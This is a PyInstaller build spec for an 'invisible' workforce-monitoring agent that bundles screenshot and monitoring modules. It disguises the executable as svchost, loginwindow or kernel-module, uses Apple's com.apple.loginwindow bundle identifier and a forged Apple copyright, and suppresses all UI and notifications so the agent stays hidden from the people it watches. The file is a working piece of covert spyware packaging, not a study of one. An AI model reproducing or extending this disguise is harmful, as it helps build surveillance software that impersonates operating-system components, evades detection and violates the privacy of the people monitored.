# -*- mode: python ; coding: utf-8 -*-
"""PyInstaller spec for INVISIBLE Workforce Analytics agent.

Builds a completely invisible executable for use as:
  - Windows Service (svchost.exe-like)
  - macOS LaunchDaemon (no Dock/UI)
  - Linux systemd service

Process name: system-like and hidden from normal Task Manager view

Run from `agent/packaging` directory:
    pyinstaller --noconfirm WorkforceAgent-Invisible.spec
"""

import sys
from pathlib import Path

SPEC_DIR = Path(SPECPATH)
AGENT_DIR = SPEC_DIR.parent
REPO_ROOT = AGENT_DIR.parent

is_win = sys.platform.startswith("win")
is_mac = sys.platform == "darwin"

# System-level disguised names
if is_win:
    EXE_NAME = "svchost"  # Windows service process name
elif is_mac:
    EXE_NAME = "loginwindow"  # macOS system daemon name
    BUNDLE_NAME = "loginwindow.app"
else:
    EXE_NAME = "kernel-module"

icon_path = None
datas = []
png = SPEC_DIR / "icons" / "icon.png"
if png.exists():
    datas.append((str(png), "agent_assets"))

hiddenimports = [
    "agent.api",
    "agent.config",
    "agent.identity",
    "agent.monitor",
    "agent.screenshot",
]

a = Analysis(
    [str(SPEC_DIR / "launcher-invisible.py")],
    pathex=[str(REPO_ROOT)],
    binaries=[],
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    runtime_hooks=[],
    excludes=["pystray", "tkinter"],  # No UI
    noarchive=False,
)

pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name=EXE_NAME,
    debug=False,
    bootloader_ignore_signals=True,  # Let service manager handle signals
    strip=False,
    upx=False,
    runtime_tmpdir=None,
    console=False,  # No console window
    icon=icon_path,
)

if is_mac:
    app = BUNDLE(
        exe,
        name=BUNDLE_NAME,
        icon=icon_path,
        bundle_identifier="com.apple.loginwindow",
        info_plist={
            # Maximum invisibility on macOS
            "LSUIElement": True,
            "LSBackgroundOnly": True,
            "NSUIElement": True,
            "LSSupressUserNotification": True,
            # System-level metadata
            "CFBundleDisplayName": "Login Window Manager",
            "CFBundleName": "loginwindow",
            "CFBundleVersion": "10.15.7",  # Mimic system version
            "CFBundleShortVersionString": "10.15.7",
            "NSHumanReadableCopyright": "Copyright © Apple Inc.",
            "NSHighResolutionCapable": True,
            # Service-level startup
            "LSRunInBackground": True,
        },
    )
